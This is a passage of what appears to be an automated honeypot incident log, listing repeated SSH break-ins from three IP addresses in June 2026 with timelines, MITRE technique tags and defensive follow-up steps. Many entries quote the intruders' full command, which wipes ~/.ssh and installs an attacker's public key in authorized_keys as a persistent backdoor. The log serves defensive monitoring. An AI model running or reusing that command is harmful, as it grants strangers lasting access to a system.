| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:21:47` | `cowrie.session.connect` |
| `2026-06-12 19:21:47` | `cowrie.client.version` |
| `2026-06-12 19:21:47` | `cowrie.client.kex` |
| `2026-06-12 19:21:48` | `cowrie.login.success` |
| `2026-06-12 19:21:49` | `cowrie.session.params` |
| `2026-06-12 19:21:49` | `cowrie.command.input` |
| `2026-06-12 19:21:49` | `cowrie.command.failed` |
| `2026-06-12 19:21:49` | `cowrie.log.closed` |
| `2026-06-12 19:21:50` | `cowrie.session.params` |
| `2026-06-12 19:21:50` | `cowrie.command.input` |
| `2026-06-12 19:21:50` | `cowrie.session.file_download` |
| `2026-06-12 19:21:50` | `cowrie.log.closed` |
| `2026-06-12 19:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08f1aceabd49

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:21 |
| **Last Seen** | 2026-06-12 19:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:21:53` | `cowrie.session.connect` |
| `2026-06-12 19:21:53` | `cowrie.client.version` |
| `2026-06-12 19:21:53` | `cowrie.client.kex` |
| `2026-06-12 19:21:55` | `cowrie.login.success` |
| `2026-06-12 19:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1de4669292

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:23 |
| **Last Seen** | 2026-06-12 19:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:23:58` | `cowrie.session.connect` |
| `2026-06-12 19:23:58` | `cowrie.client.version` |
| `2026-06-12 19:23:59` | `cowrie.client.kex` |
| `2026-06-12 19:23:59` | `cowrie.login.success` |
| `2026-06-12 19:24:00` | `cowrie.session.params` |
| `2026-06-12 19:24:00` | `cowrie.command.input` |
| `2026-06-12 19:24:00` | `cowrie.command.failed` |
| `2026-06-12 19:24:00` | `cowrie.log.closed` |
| `2026-06-12 19:24:00` | `cowrie.session.params` |
| `2026-06-12 19:24:00` | `cowrie.command.input` |
| `2026-06-12 19:24:01` | `cowrie.session.file_download` |
| `2026-06-12 19:24:01` | `cowrie.log.closed` |
| `2026-06-12 19:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222ef76aed91

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:24 |
| **Last Seen** | 2026-06-12 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:24:03` | `cowrie.session.connect` |
| `2026-06-12 19:24:03` | `cowrie.client.version` |
| `2026-06-12 19:24:04` | `cowrie.client.kex` |
| `2026-06-12 19:24:05` | `cowrie.login.success` |
| `2026-06-12 19:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142c13beb9da

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:25 |
| **Last Seen** | 2026-06-12 19:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:25:52` | `cowrie.session.connect` |
| `2026-06-12 19:25:52` | `cowrie.client.version` |
| `2026-06-12 19:25:52` | `cowrie.client.kex` |
| `2026-06-12 19:25:52` | `cowrie.login.success` |
| `2026-06-12 19:25:52` | `cowrie.session.params` |
| `2026-06-12 19:25:52` | `cowrie.command.input` |
| `2026-06-12 19:25:52` | `cowrie.command.failed` |
| `2026-06-12 19:25:53` | `cowrie.log.closed` |
| `2026-06-12 19:25:53` | `cowrie.session.params` |
| `2026-06-12 19:25:53` | `cowrie.command.input` |
| `2026-06-12 19:25:53` | `cowrie.session.file_download` |
| `2026-06-12 19:25:53` | `cowrie.log.closed` |
| `2026-06-12 19:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8e2094e5bc

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:25 |
| **Last Seen** | 2026-06-12 19:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:25:55` | `cowrie.session.connect` |
| `2026-06-12 19:25:55` | `cowrie.client.version` |
| `2026-06-12 19:25:55` | `cowrie.client.kex` |
| `2026-06-12 19:25:55` | `cowrie.login.success` |
| `2026-06-12 19:25:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b08eb7990d9

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:26 |
| **Last Seen** | 2026-06-12 19:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:26:34` | `cowrie.session.connect` |
| `2026-06-12 19:26:34` | `cowrie.client.version` |
| `2026-06-12 19:26:34` | `cowrie.client.kex` |
| `2026-06-12 19:26:35` | `cowrie.login.success` |
| `2026-06-12 19:26:35` | `cowrie.session.params` |
| `2026-06-12 19:26:35` | `cowrie.command.input` |
| `2026-06-12 19:26:35` | `cowrie.command.failed` |
| `2026-06-12 19:26:36` | `cowrie.log.closed` |
| `2026-06-12 19:26:36` | `cowrie.session.params` |
| `2026-06-12 19:26:36` | `cowrie.command.input` |
| `2026-06-12 19:26:36` | `cowrie.session.file_download` |
| `2026-06-12 19:26:36` | `cowrie.log.closed` |
| `2026-06-12 19:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ffa08a6582

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:26 |
| **Last Seen** | 2026-06-12 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:26:40` | `cowrie.session.connect` |
| `2026-06-12 19:26:40` | `cowrie.client.version` |
| `2026-06-12 19:26:40` | `cowrie.client.kex` |
| `2026-06-12 19:26:41` | `cowrie.login.success` |
| `2026-06-12 19:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e526c41333

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:27 |
| **Last Seen** | 2026-06-12 19:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:27:51` | `cowrie.session.connect` |
| `2026-06-12 19:27:51` | `cowrie.client.version` |
| `2026-06-12 19:27:51` | `cowrie.client.kex` |
| `2026-06-12 19:27:51` | `cowrie.login.success` |
| `2026-06-12 19:27:52` | `cowrie.session.params` |
| `2026-06-12 19:27:52` | `cowrie.command.input` |
| `2026-06-12 19:27:52` | `cowrie.command.failed` |
| `2026-06-12 19:27:52` | `cowrie.log.closed` |
| `2026-06-12 19:27:52` | `cowrie.session.params` |
| `2026-06-12 19:27:52` | `cowrie.command.input` |
| `2026-06-12 19:27:52` | `cowrie.session.file_download` |
| `2026-06-12 19:27:52` | `cowrie.log.closed` |
| `2026-06-12 19:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f10c5135343

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:27 |
| **Last Seen** | 2026-06-12 19:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:27:54` | `cowrie.session.connect` |
| `2026-06-12 19:27:54` | `cowrie.client.version` |
| `2026-06-12 19:27:54` | `cowrie.client.kex` |
| `2026-06-12 19:27:55` | `cowrie.login.success` |
| `2026-06-12 19:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3646833ceb6

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:28 |
| **Last Seen** | 2026-06-12 19:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:28:54` | `cowrie.session.connect` |
| `2026-06-12 19:28:54` | `cowrie.client.version` |
| `2026-06-12 19:28:54` | `cowrie.client.kex` |
| `2026-06-12 19:28:55` | `cowrie.login.success` |
| `2026-06-12 19:28:55` | `cowrie.session.params` |
| `2026-06-12 19:28:55` | `cowrie.command.input` |
| `2026-06-12 19:28:55` | `cowrie.command.failed` |
| `2026-06-12 19:28:55` | `cowrie.log.closed` |
| `2026-06-12 19:28:56` | `cowrie.session.params` |
| `2026-06-12 19:28:56` | `cowrie.command.input` |
| `2026-06-12 19:28:56` | `cowrie.session.file_download` |
| `2026-06-12 19:28:56` | `cowrie.log.closed` |
| `2026-06-12 19:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e53ccefdb28

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:28 |
| **Last Seen** | 2026-06-12 19:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:28:59` | `cowrie.session.connect` |
| `2026-06-12 19:28:59` | `cowrie.client.version` |
| `2026-06-12 19:28:59` | `cowrie.client.kex` |
| `2026-06-12 19:29:02` | `cowrie.login.success` |
| `2026-06-12 19:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377d5dfb4d5a

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:29 |
| **Last Seen** | 2026-06-12 19:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:29:55` | `cowrie.session.connect` |
| `2026-06-12 19:29:55` | `cowrie.client.version` |
| `2026-06-12 19:29:55` | `cowrie.client.kex` |
| `2026-06-12 19:29:55` | `cowrie.login.success` |
| `2026-06-12 19:29:56` | `cowrie.session.params` |
| `2026-06-12 19:29:56` | `cowrie.command.input` |
| `2026-06-12 19:29:56` | `cowrie.command.failed` |
| `2026-06-12 19:29:56` | `cowrie.log.closed` |
| `2026-06-12 19:29:56` | `cowrie.session.params` |
| `2026-06-12 19:29:56` | `cowrie.command.input` |
| `2026-06-12 19:29:56` | `cowrie.session.file_download` |
| `2026-06-12 19:29:56` | `cowrie.log.closed` |
| `2026-06-12 19:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5341caa61cfa

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:29 |
| **Last Seen** | 2026-06-12 19:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:29:58` | `cowrie.session.connect` |
| `2026-06-12 19:29:58` | `cowrie.client.version` |
| `2026-06-12 19:29:58` | `cowrie.client.kex` |
| `2026-06-12 19:29:58` | `cowrie.login.success` |
| `2026-06-12 19:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26eb3944aa53

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:31 |
| **Last Seen** | 2026-06-12 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:31:59` | `cowrie.session.connect` |
| `2026-06-12 19:31:59` | `cowrie.client.version` |
| `2026-06-12 19:31:59` | `cowrie.client.kex` |
| `2026-06-12 19:32:00` | `cowrie.login.success` |
| `2026-06-12 19:32:00` | `cowrie.session.params` |
| `2026-06-12 19:32:00` | `cowrie.command.input` |
| `2026-06-12 19:32:00` | `cowrie.command.failed` |
| `2026-06-12 19:32:00` | `cowrie.log.closed` |
| `2026-06-12 19:32:00` | `cowrie.session.params` |
| `2026-06-12 19:32:00` | `cowrie.command.input` |
| `2026-06-12 19:32:00` | `cowrie.session.file_download` |
| `2026-06-12 19:32:00` | `cowrie.log.closed` |
| `2026-06-12 19:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51f13683f738

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:32 |
| **Last Seen** | 2026-06-12 19:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:32:02` | `cowrie.session.connect` |
| `2026-06-12 19:32:02` | `cowrie.client.version` |
| `2026-06-12 19:32:02` | `cowrie.client.kex` |
| `2026-06-12 19:32:03` | `cowrie.login.success` |
| `2026-06-12 19:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2634ccf18789

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:33 |
| **Last Seen** | 2026-06-12 19:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:33:41` | `cowrie.session.connect` |
| `2026-06-12 19:33:41` | `cowrie.client.version` |
| `2026-06-12 19:33:42` | `cowrie.client.kex` |
| `2026-06-12 19:33:42` | `cowrie.login.success` |
| `2026-06-12 19:33:43` | `cowrie.session.params` |
| `2026-06-12 19:33:43` | `cowrie.command.input` |
